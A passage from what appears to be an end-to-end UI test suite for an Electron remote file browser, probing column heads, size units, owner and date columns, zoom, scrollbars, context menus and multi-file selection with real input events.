              const saved = await until(() => (ctx.settingsNow().columnsOff ?? []).includes('owner'), 5000);
              check('turning a column off takes it off every row and off the head, and is saved', gone === 0 && headGone === 'none' && saved, [gone, headGone, ctx.settingsNow().columnsOff]);
              // And back on the same way, because a column turned off must not be a column lost.
              if (headAt) await js(front.view, `document.getElementById('fb-head').dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, clientX: ${headAt.x}, clientY: ${headAt.y} }))`);
              await sleep(150);
              await js(front.view, `[...document.querySelectorAll('.fb-menu-one')].find((b) => b.textContent.includes('Show Owner'))?.click()`);
              await sleep(250);
              const backOn = await js<string>(front.view, `getComputedStyle(document.querySelector('.fb-head-owner')).display`);
              check('and back on the same way', backOn !== 'none' && !(ctx.settingsNow().columnsOff ?? []).includes('owner'), [backOn, ctx.settingsNow().columnsOff]);
            }

            // ---- Every scrollbar in the app is the app's own ----
            //
            // His, 2026-11-19. Windows draws a seventeen-pixel bar with an arrow at each end in a grey that
            // belongs to no part of this window. What is held here is the thing a rule written once either
            // reaches or does not: every surface that really has a scrollbar on screen measures the app's
            // own width and not the browser's. The measurement is the gap between what a surface is and what
            // it can show, which is the bar itself.
            const bars = await js<{ where: string; wide: number; tall: number }[]>(front.view, `[...document.querySelectorAll('*')].map((e) => ({ where: e.id || e.className || e.tagName, wide: e.offsetWidth - e.clientWidth, tall: e.offsetHeight - e.clientHeight })).filter((b) => b.wide > 2 || b.tall > 2)`);
            const ours = bars.filter((b) => (b.wide === 0 || b.wide === 10) && (b.tall === 0 || b.tall === 10));
            check('every scrollbar on screen is the app\'s own thin one, not the browser\'s', bars.length > 0 && ours.length === bars.length, bars.slice(0, 6));

            // ---- Columns he can drag ----
            //
            // His, 2026-11-19, with his own MobaXterm beside it. A press on a grip changes the column's width
            // and does not order the list: one grip and one head are a hand's width apart, and a drag that
            // also sorted would be a drag he could not use. Driven by real presses from outside the page.
            {
              const wide = (): Promise<number> => js<number>(front.view, `Math.round(document.getElementById('fb-by-size').closest('.fb-head-cell').getBoundingClientRect().width)`);
              const orderWas = (await names()).join();
              const was = await wide();
              const grip = await at('#fb-grip-size', front);
              const w = front.view.webContents;
              if (grip) {
                w.sendInputEvent({ type: 'mouseDown', x: grip.x, y: grip.y, button: 'left', clickCount: 1 });
                for (let i = 1; i <= 5; i++) {
                  w.sendInputEvent({ type: 'mouseMove', x: grip.x + i * 12, y: grip.y, button: 'left' });
                  await sleep(25);
                }
                w.sendInputEvent({ type: 'mouseUp', x: grip.x + 60, y: grip.y, button: 'left', clickCount: 1 });
                await sleep(250);
              }
              const now = await wide();
              check('a grip in the head makes its column wider, and the press is not the head\'s own', grip !== null && now >= was + 40 && (await names()).join() === orderWas, [was, now, grip !== null]);
              // And it is kept: main was told, so the next tab opens with the same shape rather than the one
              // this tab was built with.
              const saved = await until(async () => (ctx.settingsNow().columns?.size ?? 0) >= was + 40, 5000);
              check('the width he dragged is saved, so the next tab starts with it', saved, ctx.settingsNow().columns);
              // Home on the grip puts the column back to the width its own contents ask for.
              await js(front.view, `(() => { const g = document.getElementById('fb-grip-size'); g.focus(); g.dispatchEvent(new KeyboardEvent('keydown', { key: 'Home', bubbles: true })); })()`);
              await sleep(250);
              const back = await wide();
              check('and it goes back to its own size, which no drag can give back by hand', back < now - 30 && (ctx.settingsNow().columns?.size ?? 0) === 0, [now, back, ctx.settingsNow().columns]);
            }
            // The folder is listed again before the columns are read. The lab has made several files since the
            // pane last asked, and on a Windows runner the probes that re-list are the ones skipped there, so
            // everything below used to be read off a list made before half of this folder existed: four rows
            // where the box held eight. A stale list is not a list of that folder.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('wide.log'), 10_000);
            await sleep(200);
            const asksBefore = { ...ctx.filesAsked() };
            // ---- The list has heads over its columns, and they hold at every size the pane has. ----
            // Beside MobaXterm he said the list had no column heads, that clicking a size should order by it,
            // that the sizes were set in the name's own weight, and that one press of the zoom wrecked the
            // whole thing. All four were one cause: the rows were a flex line with the name told to take what
            // was left, so the name was the only thing that could give, and the one column on the right said
            // whatever the order happened to be.
            const headNames = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-head .fb-by')].map((b) => b.textContent.trim())`);
            // The size head names the unit the whole column is in, so what it says is Size and that unit.
            check('the list has a head over each of its columns, each saying what it orders', headNames[0] === 'Name' && /^Size \((B|KB|MB|GB|TB|PB)\)$/.test(headNames[1] ?? '') && headNames[2] === 'Modified' && headNames[3] === 'Owner' && headNames.length === 4, headNames);
            const everyRowHasBoth = await js<boolean>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.name !== '..' && r.dataset.kind === 'file').every((r) => r.querySelector('.fb-size')?.textContent.trim() && r.querySelector('.fb-when')?.textContent.trim())`);
            check('and every file carries both its size and its time, whatever the list is ordered by', everyRowHasBoth, everyRowHasBoth);
            // One unit for the whole column, named once on the head, with digits alone in the rows. A column
            // whose rows each carry their own unit cannot be read down: 1.1 KB over 942 B over 913 B is three
            // units in three rows and nothing comparable by eye (his own screen, 2026-11-18). This folder holds
            // a file of megabytes and files of a few bytes, so it is the case that decides it: the small ones
            // must say they are small, not read as nothing.
            const sizeCol = await js<{ head: string; cells: string[]; bytes: number[]; every: string[] }>(front.view, `(() => {
              const all = [...document.querySelectorAll('#fb-list .fb-row')];
              const rows = all.filter((r) => r.dataset.kind === 'file');
              return {
                head: document.getElementById('fb-by-size')?.textContent?.trim() ?? '',
                cells: rows.map((r) => r.querySelector('.fb-size')?.textContent?.trim() ?? ''),
                bytes: rows.map((r) => Number(r.dataset.bytes)),
                every: all.map((r) => r.querySelector('.fb-size')?.textContent?.trim() ?? ''),
              };
            })()`);
            const unitNamed = /^Size \((B|KB|MB|GB|TB|PB)\)$/.test(sizeCol.head);
            // Every row's cell, not only the files': a link that wrote the word "link" here put a word in a
            // column of digits under a head naming one unit, and a column with a word in it lines up with
            // nothing. A row that has no size leaves the cell empty, as a folder does.
            const digitsOnly = sizeCol.every.every((c) => /^(|<0\.1|\d+(\.\d)?)$/.test(c)) && sizeCol.cells.every((c) => c !== '');
            const noneReadsNothing = sizeCol.cells.every((c, i) => !(sizeCol.bytes[i]! > 0 && c === '0'));
            const smallOnesSaySo = sizeCol.cells.includes('<0.1');
            // Two files are enough to prove it, and two is all a Windows runner has here: it cannot hold the
            // odd names the rest of this folder is made of.
            check('every size in the column is in the one unit its head names, as digits alone, and a file with bytes in it never reads nothing', unitNamed && digitsOnly && noneReadsNothing && smallOnesSaySo && sizeCol.cells.length >= 2, sizeCol);
            // Who owns a file, which is the column he works by: he is root across a fleet, and a row whose
            // owner he cannot see is a row he cannot act on. A box that says the owner in words is shown the
            // word; one that says only a number is shown the number; and a box that says neither is shown
            // nothing, because an owner of 0 is root and a missing owner drawn as root would be a lie. All
            // three are on screen here: this lab answers in words for every file but one.
            const owners = await js<Record<string, string>>(front.view, `(() => {
              const out = {};
              for (const r of document.querySelectorAll('#fb-list .fb-row')) out[r.dataset.name] = r.querySelector('.fb-owner')?.textContent?.trim() ?? '(no cell)';
              return out;
            })()`);
            const named = Object.entries(owners).filter(([n]) => n !== '..' && n !== 'syslog');
            if (process.platform === 'win32') {
              // A Windows box has no owner of the kind this column shows, and the lab's box here is this PC.
              // It says neither a name nor a number, so every cell is empty: the third case the column is
              // built for, and the one that must never come out as root.
              check('a box that can say no owner at all leaves the column empty, and never draws it as root', named.length >= 2 && Object.values(owners).every((w) => w === ''), owners);
            } else {
            const everyRowSaysWho = named.length >= 2 && named.every(([, w]) => /^[A-Za-z][\w.-]*$/.test(w));
            check('every row says who owns it, in the words the box used', everyRowSaysWho && owners['..'] === '', owners);
            // And the one the box named no owner for in words falls back to the number it did give.
            check('a box that gives only a number for the owner is shown that number, not a name it never said', /^\d+$/.test(owners['syslog'] ?? ''), owners['syslog']);
            }
            // The date a file was changed, short enough for the column and still able to answer which of two
            // files is the newer: a day and a time for anything but today, the time alone for today's. One file
            // was put back a year when the lab made them, so both shapes are on screen here: a column that
            // dropped the date would hold only the first.
            const whens = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => r.querySelector('.fb-when')?.textContent?.trim() ?? '')`);
            const shapeOk = whens.length >= 2 && whens.every((w) => /^\d\d:\d\d$|^\d\d-\d\d-\d\d \d\d:\d\d$/.test(w));
            const bothShapes = whens.some((w) => /^\d\d:\d\d$/.test(w)) && whens.some((w) => /^\d\d-\d\d-\d\d \d\d:\d\d$/.test(w));
            check('and every time it says is a time, with its day on it unless the day is today', shapeOk && bothShapes, whens);
            // The zoom, which is the press he can wreck the list with. Every step of it, not one: the first
            // version of this probe pressed Ctrl and plus once, held that nothing was cut, and passed, while
            // at 150 and 200 per cent the name was cut to nothing and the time column came out wider than it.
            // What gives way is measured against the list's own size now, so it gives way as the text grows
            // and not only when the pane is dragged narrower.
            const rowNow = (): Promise<{ name: number; numbers: number; cut: number; size: string; timeGone: boolean; sizeGone: boolean; canScroll: boolean; headWith: boolean }> => js(front.view, `(() => {
              const list = document.getElementById('fb-list');
              const r = [...document.querySelectorAll('#fb-list .fb-row')].find((x) => x.dataset.kind === 'file');
              if (!r) return { name: -1, numbers: -1, cut: -1, size: '?', timeGone: true, sizeGone: true, canScroll: false, headWith: false };
              const w = (q) => { const e = r.querySelector(q); return e ? Math.round(e.getBoundingClientRect().width) : 0; };
              // The head has to ride the list's own sideways scroll, or a column and its name come apart.
              const head = document.getElementById('fb-head');
              const before = Math.round(head.getBoundingClientRect().left);
              list.scrollLeft = 40;
              const moved = Math.round(head.getBoundingClientRect().left) < before;
              const canScroll = list.scrollWidth > list.clientWidth + 1;
              list.scrollLeft = 0;
              void before;
              return {
                name: w('.fb-name'), numbers: w('.fb-size') + w('.fb-when'),
                cut: [...document.querySelectorAll('#fb-list .fb-row .fb-name')].filter((n) => n.scrollWidth > n.clientWidth + 1).length,
                size: document.getElementById('files').dataset.size,
                timeGone: getComputedStyle(r.querySelector('.fb-when')).display === 'none',
                sizeGone: getComputedStyle(r.querySelector('.fb-size')).display === 'none',
                canScroll, headWith: !canScroll || moved,
              };
            })()`);
            await js(front.view, `document.getElementById('fb-list').focus()`);
            const steps: { size: string; name: number; numbers: number; cut: number; timeGone: boolean; sizeGone: boolean; canScroll: boolean; headWith: boolean }[] = [];
            for (let i = 0; i < 6; i++) {
              const now = await rowNow();
              steps.push({ size: now.size, name: now.name, numbers: now.numbers, cut: now.cut, timeGone: now.timeGone, sizeGone: now.sizeGone, canScroll: now.canScroll, headWith: now.headWith });
              await js(front.view, `document.getElementById('fb-list').dispatchEvent(new KeyboardEvent('keydown', { key: '+', ctrlKey: true, bubbles: true }))`);
              await sleep(130);
            }
            const everCut = steps.filter((x) => x.cut > 0);
            const everEaten = steps.filter((x) => x.numbers >= x.name);
            // Nothing gives way any more: that is the change. So what is held is the opposite of what this
            // probe held before — every column is still on screen at every size, and where the row no longer
            // fits the pane the pane can be scrolled to the rest of it, with the head riding that scroll.
            // A hidden column cannot be scrolled to, which is why hiding was the wrong answer.
            const everHidden = steps.filter((x) => x.timeGone || x.sizeGone);
            const headCameApart = steps.filter((x) => !x.headWith);
            check(`at every size this list has, up to ${steps[steps.length - 1]!.size} per cent, no name is cut, no column is hidden, and where the row outgrows the pane the pane scrolls to it with its head`,
              everCut.length === 0 && everEaten.length === 0 && everHidden.length === 0 && headCameApart.length === 0 && steps[steps.length - 1]!.size === '200',
              { steps, everCut, everEaten, everHidden, headCameApart });
            await js(front.view, `document.getElementById('fb-list').dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
            await sleep(150);

            // ---- The menu under the right button. ----
            // He called this one of the biggest gaps, and it was total: not one contextmenu handler existed
            // anywhere in the app, on a file, a folder, the empty part of a list, the path, the terminal or a
            // tab. What is in it is decided by what the press came down on, as his own reference menus do.
            const menuOn = async (what: string): Promise<string[]> => {
              await js(front.view, `(() => { const r = ${what}; const b = r.getBoundingClientRect(); r.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, clientX: Math.round(b.left + 8), clientY: Math.round(b.top + 4) })); })()`);
              await sleep(160);
              await sweepMenu(front.view, `the list, on ${what.slice(0, 40)}`);
              return js<string[]>(front.view, `[...document.querySelectorAll('#fb-menu .fb-menu-one .fb-menu-words')].map((w) => w.textContent)`);
            };
            const shutMenuNow = (): Promise<void> => js(front.view, `document.getElementById('fb-menu')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
            const aFile = await js<string>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].find((r) => r.dataset.kind === 'file')?.dataset.name ?? ''`);
            const aFolder = await js<string>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].find((r) => r.dataset.kind === 'folder' && r.dataset.name !== '..')?.dataset.name ?? ''`);
            check('there is a file and a folder to press on', aFile !== '' && aFolder !== '', [aFile, aFolder]);
            // The Electron tell (his 15). A press dragged across two rows used to take the browser's own text
            // selection with it, so what left the pointer was a grey ghost of the names rather than the file.
            // The list has a selection of its own, so there is nothing for the letters to mean. Held by doing
            // it — a real press, a real drag, a real release — and by what the window computes for the three
            // places that must differ: the list, which selects rows; the terminal, which has always selected
            // its own text; and the field he types a search into, which keeps its caret.
            {
              // The press is the window's own, not an event made up in the page: a selection is Chromium's to
              // make, and it makes none for a mousedown a script dispatched. A probe built on dispatched
              // events here passes whatever the stylesheet says, which is a probe that cannot fail.
              const two = await js<{ x1: number; y1: number; x2: number; y2: number } | null>(front.view, `(() => {
                const rows = [...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.name !== '..');
                if (rows.length < 2) return null;
                const a = rows[0].getBoundingClientRect(), b = rows[1].getBoundingClientRect();
                return { x1: Math.round(a.left + 30), y1: Math.round(a.top + a.height / 2), x2: Math.round(b.left + 90), y2: Math.round(b.top + b.height / 2) };
              })()`);
              const w = front.view.webContents;
              if (two) {
                w.sendInputEvent({ type: 'mouseDown', x: two.x1, y: two.y1, button: 'left', clickCount: 1 });
                for (let i = 1; i <= 6; i++) {
                  w.sendInputEvent({ type: 'mouseMove', x: Math.round(two.x1 + ((two.x2 - two.x1) * i) / 6), y: Math.round(two.y1 + ((two.y2 - two.y1) * i) / 6), button: 'left' });
                  await sleep(20);
                }
                w.sendInputEvent({ type: 'mouseUp', x: two.x2, y: two.y2, button: 'left', clickCount: 1 });
                await sleep(120);
              }
              const dragAcross = two === null ? 'too few rows' : await js<string>(front.view, `(window.getSelection()?.toString() ?? '').trim()`);
              const picks = await js<{ list: string; row: string; term: string; find: string }>(front.view, `(() => {
                const g = (q) => { const e = document.querySelector(q); return e ? getComputedStyle(e).userSelect : 'none such element'; };
                return { list: g('#fb-list'), row: g('#fb-list .fb-row'), term: g('#term'), find: g('#files-pane input') };
              })()`);
              check('a press dragged across the list carries no ghost of its letters, and the terminal and the search field keep their own selection',
                dragAcross === '' && picks.list === 'none' && picks.row === 'none' && picks.term !== 'none' && picks.find === 'text',
                [dragAcross.slice(0, 60), picks]);

              // And a press begun on the empty part of the list and dragged back up over the rows takes every
              // row it covers, which is how every file list a person has used works and how his own MobaXterm
              // does it. Driven the same way, by real presses from outside the page: a band drawn by made-up
              // events would prove the handler and not the thing.
              const band = await js<{ x: number; yEmpty: number; yTop: number; want: string[] } | null>(front.view, `(() => {
                const list = document.getElementById('fb-list');
                const rows = [...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.name !== '..');
                if (rows.length < 3) return null;
                const box = list.getBoundingClientRect();
                const last = rows[rows.length - 1].getBoundingClientRect();
                // Below the last row there must really be empty list to press on, or this is pressing a row.
                if (box.bottom - last.bottom < 40) return null;
                const third = rows[rows.length - 3].getBoundingClientRect();
                return {
                  x: Math.round(box.left + 40),
                  yEmpty: Math.round(last.bottom + 24),
                  yTop: Math.round(third.top + third.height / 2),
                  want: rows.slice(rows.length - 3).map((r) => r.dataset.name),
                };
              })()`);
              // What the list says is chosen, read where it is drawn.
              const taken = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row[data-chosen="yes"]')].map((r) => r.dataset.name)`);
              if (band === null) {
                check('a press dragged up from the empty part of the list takes every row it covers', false, 'there was no empty part of the list to press on');
              } else {
                w.sendInputEvent({ type: 'mouseDown', x: band.x, y: band.yEmpty, button: 'left', clickCount: 1 });
                for (let i = 1; i <= 6; i++) {
                  w.sendInputEvent({ type: 'mouseMove', x: band.x + 60, y: Math.round(band.yEmpty + ((band.yTop - band.yEmpty) * i) / 6), button: 'left' });
                  await sleep(25);
                }
                const drawn = await js<boolean>(front.view, `!!document.getElementById('fb-band') && !document.getElementById('fb-band').hidden`);
                const whileHeld = await taken();
                w.sendInputEvent({ type: 'mouseUp', x: band.x + 60, y: band.yTop, button: 'left', clickCount: 1 });
                await sleep(150);
                const after = await taken();
                const gone = await js<boolean>(front.view, `!document.getElementById('fb-band')`);
                check('a press dragged up from the empty part of the list takes every row it covers', drawn && gone && after.join() === band.want.join() && whileHeld.join() === after.join() && (await foot()).includes(`${band.want.length} chosen`), [drawn, gone, after, band.want, whileHeld]);
                // The way out of the folder is not a row a person can act on, so a band over it takes nothing.
                check('and the way out of the folder is never taken by it', !after.includes('..'), after);
                // A press on the empty part that is not dragged is a press, not a band: it clears what is
                // chosen, and it must not leave a band of nothing lying across the pane.
                w.sendInputEvent({ type: 'mouseDown', x: band.x, y: band.yEmpty, button: 'left', clickCount: 1 });
                w.sendInputEvent({ type: 'mouseUp', x: band.x, y: band.yEmpty, button: 'left', clickCount: 1 });
                await sleep(150);
                check('a press on the empty part that is not dragged clears what is chosen and draws no band', (await taken()).length === 0 && (await js<boolean>(front.view, `!document.getElementById('fb-band')`)), [await taken(), await foot()]);
                // A chosen row reaches both edges of the list, wherever the list is scrolled to. Every row is
                // the same width as every other, which is the only way that can be true: a row only as wide as
                // the pane leaves its own colour short of the end as soon as the list is scrolled sideways,
                // and the shortest row in any folder is the way out of it.
                const edges = await js<{ scrolled: number; widths: number[]; sheet: number; reach: number[] } | null>(front.view, `(() => {
                  const list = document.getElementById('fb-list');
                  const sheet = document.getElementById('fb-sheet');
                  if (!list || !sheet) return null;
                  list.scrollLeft = list.scrollWidth;
                  const rows = [...document.querySelectorAll('#fb-list .fb-row')];
                  const at = list.getBoundingClientRect();
                  return {
                    scrolled: list.scrollLeft,
                    widths: rows.map((r) => Math.round(r.getBoundingClientRect().width)),
                    sheet: Math.round(sheet.getBoundingClientRect().width),
                    // Against the list's own content, not its border box: a vertical scrollbar sits inside the
                    // border, so measuring to the border would ask the rows to reach under the scrollbar.
                    reach: rows.map((r) => Math.round(r.getBoundingClientRect().right - (at.left + list.clientWidth))),
                  };
                })()`);
                // The list is made to scroll first, by making its text big enough that a row does not fit.
                for (let i = 0; i < 5; i++) {
                  await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '+', ctrlKey: true, bubbles: true }))`);
                  await sleep(60);
                }
                await sleep(200);
                const wide = await js<{ scrolled: number; widths: number[]; sheet: number; reach: number[] } | null>(front.view, `(() => {
                  const list = document.getElementById('fb-list');
                  const sheet = document.getElementById('fb-sheet');
                  if (!list || !sheet) return null;
                  list.scrollLeft = list.scrollWidth;
                  const rows = [...document.querySelectorAll('#fb-list .fb-row')];
                  const at = list.getBoundingClientRect();
                  return {
                    scrolled: list.scrollLeft,
                    widths: rows.map((r) => Math.round(r.getBoundingClientRect().width)),
                    sheet: Math.round(sheet.getBoundingClientRect().width),
                    // Against the list's own content, not its border box: a vertical scrollbar sits inside the
                    // border, so measuring to the border would ask the rows to reach under the scrollbar.
                    reach: rows.map((r) => Math.round(r.getBoundingClientRect().right - (at.left + list.clientWidth))),
                  };
                })()`);
                const allOneWidth = wide !== null && wide.widths.length > 2 && wide.widths.every((w) => w === wide.sheet);
                const noneFallsShort = wide !== null && wide.reach.every((d) => d >= 0);
                check('every row is the width of the widest, so a chosen row reaches the edge however far the list is scrolled', wide !== null && wide.scrolled > 0 && allOneWidth && noneFallsShort, [edges, wide]);
                await js(front.view, `document.getElementById('files')?.dispatchEvent(new KeyboardEvent('keydown', { key: '0', ctrlKey: true, bubbles: true }))`);
                await sleep(200);
              }
            }
            const onFile = await menuOn(`document.querySelector('#fb-list .fb-row[data-name="${aFile}"]')`);
            check(`a file's menu offers what a file can do: ${onFile.join(', ')}`, onFile.includes('Open') && onFile.includes('Bring it over') && onFile.includes('Rename') && onFile.includes('Delete') && onFile.includes("The box's own hash"), onFile);
            const keysOn = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-menu .fb-menu-keys')].map((k) => k.textContent)`);
            check(`and every item that has a press says it on itself: ${keysOn.join(' ')}`, keysOn.includes('Delete') && keysOn.includes('F2') && keysOn.includes('Ctrl+S'), keysOn);
            await shutMenuNow();
            check('Escape shuts it', (await js<number>(front.view, `document.getElementById('fb-menu') ? 1 : 0`)) === 0, '');
            const onFolder = await menuOn(`document.querySelector('#fb-list .fb-row[data-name="${aFolder}"]')`);
            check(`a folder's menu is not a file's: ${onFolder.join(', ')}`, onFolder.includes('Open') && !onFolder.includes('Bring it over') && !onFolder.includes("The box's own hash") && onFolder.includes('Delete'), onFolder);
            await shutMenuNow();
            const onNothing = await menuOn(`document.getElementById('fb-list')`);
            check(`a press on the empty part is about the folder itself: ${onNothing.join(', ')}`, onNothing.includes('New folder') && onNothing.includes('Send a file here') && !onNothing.includes('Rename'), onNothing);
            await shutMenuNow();
            const twoFiles = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => r.dataset.name).slice(0, 2)`);
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${twoFiles[0]}"]').dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0 }))`);
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${twoFiles[1]}"]').dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0, ctrlKey: true }))`);
            const onSeveral = await menuOn(`document.querySelector('#fb-list .fb-row[data-name="${twoFiles[0]}"]')`);
            const stillChosen = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row[data-chosen="yes"]')].map((r) => r.dataset.name)`);
            check(`a press on one of several is about all of them, and does not lose them: ${onSeveral.join(', ')}`, onSeveral.includes('Delete 2') && onSeveral.includes('Bring 2 files over') && stillChosen.length === 2, [onSeveral, stillChosen]);
            await shutMenuNow();
            await menuOn(`document.querySelector('#fb-list .fb-row[data-name="${aFile}"]')`);
            const firstHas = await js<boolean>(front.view, `document.activeElement?.classList.contains('fb-menu-one') ?? false`);
            await js(front.view, `document.getElementById('fb-menu').dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown', bubbles: true }))`);
            const moved = await js<string>(front.view, `document.activeElement?.querySelector('.fb-menu-words')?.textContent ?? ''`);
            check(`it opens with the keyboard on its first item and the arrows move down it: ${moved}`, firstHas && moved !== '' && moved !== onFile[0], [firstHas, moved, onFile[0]]);
            await shot('a-menu', 'the menu under the right button, on a file', front);
            await shutMenuNow();

            // ---- A colour for each kind of thing. ----
            // Beside MobaXterm, whose list puts a different coloured mark on every kind, every row here wore
            // one grey glyph: a folder of a hundred files had to be read word by word.
            // A row's mark is read by the class that names its kind, not by whichever class happens to come
            // first: a row wearing the picture of its own kind carries that one too.
            const marks = await js<{ name: string; kind: string; colour: string; picture: string }[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => { const g = r.querySelector('.fb-ft'); return { name: r.dataset.name, kind: [...(g?.classList ?? [])].find((c) => c.startsWith('fb-ft-') && c !== 'fb-ft-own') ?? '', colour: g ? getComputedStyle(g).color : '', picture: g?.tagName === 'IMG' ? (g.getAttribute('data-kind') ?? '') : '' }; })`);
            const logs = marks.filter((m) => m.name.endsWith('.log'));
            const folders = marks.filter((m) => m.kind === 'fb-ft-folder');
            check(`every .log is marked a log and every folder a folder: ${logs.length} logs, ${folders.length} folders`, logs.length > 0 && logs.every((m) => m.kind === 'fb-ft-log') && folders.length > 0, [logs.slice(0, 3), folders.slice(0, 3)]);
            // And a .log wears the picture of a log, which is the whole point of the set: the shapes Berth
            // draws itself say "a file" and nothing more, and he reads a kind at a glance in his editor.
            // Every picture on screen is asked for by a name out of Berth's own table and really arrives:
            // a name the app does not hold would be counted by the page that asked for it.
            const wearing = marks.filter((m) => m.picture !== '');
            const drawn = await js<{ shown: number; empty: string[] }>(front.view, `(() => {
              const ones = [...document.querySelectorAll('#fb-list img.fb-ft-own')];
              return { shown: ones.length, empty: ones.filter((i) => !i.complete || i.naturalWidth === 0).map((i) => i.getAttribute('data-kind') ?? '?') };
            })()`);
            const scripts = marks.find((m) => m.name === 'scripts');
            check('a file wears the picture of its own kind, and every picture asked for really arrives', logs.every((m) => m.picture === 'log') && wearing.length >= 4 && drawn.shown === wearing.length && drawn.empty.length === 0, { logs: logs.map((m) => m.picture), wearing: wearing.length, drawn });
            // And a folder wears one too, by its own name, while a folder whose name says nothing keeps the
            // shape Berth draws itself rather than being given a picture that means something else.
            const plainFolder = marks.find((m) => m.name === 'ledger');
            check('a folder named for what is in it wears that picture, and one that is not keeps its own shape', scripts?.picture === 'folder-scripts' && plainFolder?.picture === '' && plainFolder?.kind === 'fb-ft-folder', [scripts, plainFolder]);
            const colours = new Set(marks.filter((m) => m.colour !== '').map((m) => m.colour));
            check(`and the kinds do not all wear one colour: ${colours.size} colours among ${marks.length} rows`, colours.size >= 3, [...colours]);
            // A name with nothing to read at its end is a plain file, which is most of what sits in /etc.
            const plain = marks.find((m) => !m.name.includes('.') && !['fb-ft-folder', 'fb-ft-link', 'fb-ft-pipe', 'fb-ft-device', 'fb-ft-socket', 'fb-ft-unknown', 'fb-ft-up'].includes(m.kind) && m.name !== '..');
            check('a name with no end to read is a plain file, not a kind guessed at', plain === undefined || plain.kind === 'fb-ft-file', plain);

            // ---- Several files at once. ----
            // "i cant do select multiple files like mobaxterm". The list had no notion of a selection at all:
            // one row held the keyboard's place and that was the whole of it.
            const chosenNow = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row[data-chosen="yes"]')].map((r) => r.dataset.name)`);
            const press = (name: string, mods: Record<string, boolean> = {}): Promise<void> => js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${name}"]').dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0, ${Object.entries(mods).map(([k, v]) => `${k}: ${v}`).join(', ')} }))`);
            // The names are read off the list as it is drawn now, never written in here: a filter or an order
            // left on by an earlier probe would make a written-in name a row that is not there.
            const order = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name).filter((n) => n !== '..')`);
            check('there are enough rows drawn to choose among', order.length >= 5, order);
            const one = order[1]!;
            const other = order[3]!;
            await press(one);
            check('a press chooses the one it lands on', JSON.stringify(await chosenNow()) === JSON.stringify([one]), await chosenNow());
            await press(other, { ctrlKey: true });
            const two = await chosenNow();
            check('Ctrl and a press adds another without losing the first', two.length === 2 && two.includes(one) && two.includes(other), two);
            await press(other, { ctrlKey: true });
            check('and the same press again takes it away', JSON.stringify(await chosenNow()) === JSON.stringify([one]), await chosenNow());
            await press(order[0]!);
            await press(order[4]!, { shiftKey: true });
            const run = await chosenNow();
            const from = 0;
            const to = 4;
            check(`Shift and a press takes the whole run between them: ${run.length} rows`, run.length === Math.abs(to - from) + 1 && run.length > 2 && JSON.stringify(run) === JSON.stringify(order.slice(Math.min(from, to), Math.max(from, to) + 1)), [run, order.slice(Math.min(from, to), Math.max(from, to) + 1)]);
            // What a reader is told, which is not what the eye sees unless one thing writes it. The pass that
            // settles which row carries the tab stop used to write aria-selected over every row from where the
            // keyboard stands, so three rows could be chosen, three counted in the foot, and one announced.
            // Every probe #111 wrote read data-chosen, which was right the whole time.
            const announced = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row[aria-selected="true"]')].map((r) => r.dataset.name)`);
            const stops = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.tabIndex === 0).map((r) => r.dataset.name)`);
            const multi = await js<string>(front.view, `document.getElementById('fb-list')?.getAttribute('aria-multiselectable') ?? ''`);
            check(`what is announced is what is chosen: ${announced.length} announced against ${run.length} chosen`, JSON.stringify(announced) === JSON.stringify(run) && multi === 'true', [announced, run, multi]);
            check('and exactly one row carries the tab stop, which is where the keyboard stands and not what is chosen', stops.length === 1, stops);
            // What the foot says about it, which is where he reads how much he is about to move.
            await shot('chosen', 'several files chosen at once, and the foot saying how many and how much', front);
            const footSays = await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            check('and the foot says how many are chosen and how much they come to', /\d+ chosen/.test(footSays) && footSays.includes('chosen'), footSays);
            // Everything in the folder, by the one key that means it everywhere, and never the way out.
            await js(front.view, `document.getElementById('fb-list').focus()`);
            await js(front.view, `document.getElementById('fb-list').dispatchEvent(new KeyboardEvent('keydown', { key: 'a', ctrlKey: true, bubbles: true }))`);
            const all = await chosenNow();
            check(`Ctrl and A takes everything in the folder, and never the way out of it: ${all.length} of ${order.length}`, all.length === order.length && !all.includes('..'), [all.length, order.length]);
            // The arrows choose as they move, and with Shift held they take everything on the way.
            await press(order[0]!);
